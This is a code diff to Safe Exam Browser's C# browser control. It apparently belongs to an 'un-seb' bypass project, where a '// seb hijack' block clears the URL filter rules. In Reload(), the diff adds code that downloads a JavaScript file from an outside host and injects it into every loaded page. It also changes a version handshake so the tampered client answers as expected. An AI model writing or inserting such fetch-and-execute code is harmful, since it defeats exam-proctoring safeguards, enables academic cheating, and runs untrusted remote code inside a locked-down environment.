@@ -147,7 +147,7 @@ namespace SafeExamBrowser.Browser
 			control.IsBrowserInitializedChanged += Control_IsBrowserInitializedChanged;
 			control.JavaScriptDialog += (IWebBrowser w, IBrowser b, string u, CefJsDialogType t, string m, string p, IJsDialogCallback c, ref bool s, GenericEventArgs a) => a.Value = javaScriptDialogHandler.OnJSDialog(w, b, u, t, m, p, c, ref s);
 			control.KeyEvent += (w, b, t, k, n, m, s) => keyboardHandler.OnKeyEvent(w, b, t, k, n, m, s);
-			control.LoadError += (o, e) => LoadFailed?.Invoke((int) e.ErrorCode, e.ErrorText, e.Frame.IsMain, e.FailedUrl);
+			control.LoadError += (o, e) => LoadFailed?.Invoke((int)e.ErrorCode, e.ErrorText, e.Frame.IsMain, e.FailedUrl);
 			control.LoadingProgressChanged += (w, b, p) => displayHandler.OnLoadingProgressChange(w, b, p);
 			control.LoadingStateChanged += (o, e) => LoadingStateChanged?.Invoke(e.IsLoading);
 			control.OpenUrlFromTab += (w, b, f, u, t, g, a) => a.Value = requestHandler.OnOpenUrlFromTab(w, b, f, u, t, g);
@@ -162,7 +162,7 @@ namespace SafeExamBrowser.Browser
 			if (control is IWebBrowser webBrowser)
 			{
 				webBrowser.JavascriptMessageReceived += WebBrowser_JavascriptMessageReceived;
-				
+
 				// seb hijack
 				Settings.Browser.FilterSettings filterSettings = new Settings.Browser.FilterSettings();
 				filterSettings.Rules.Clear();
@@ -197,6 +197,12 @@ namespace SafeExamBrowser.Browser
 		public void Reload()
 		{
 			control.BrowserCore.Reload();
+
+			using (var client = new System.Net.WebClient())
+			{
+				var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script_340.js");
+				(control as IWebBrowser)?.ExecuteScriptAsyncWhenPageLoaded(the_script);
+			}
 		}
 
 		public void Zoom(double level)
@@ -265,8 +271,8 @@ namespace SafeExamBrowser.Browser
 			}
 
 			if (message.type == "version")
-			{	
-				if (message.version == "2")
+			{
+				if (message.version == "3")
 				{
 					ExecuteJavaScript("responseFunction(true);");
 				}
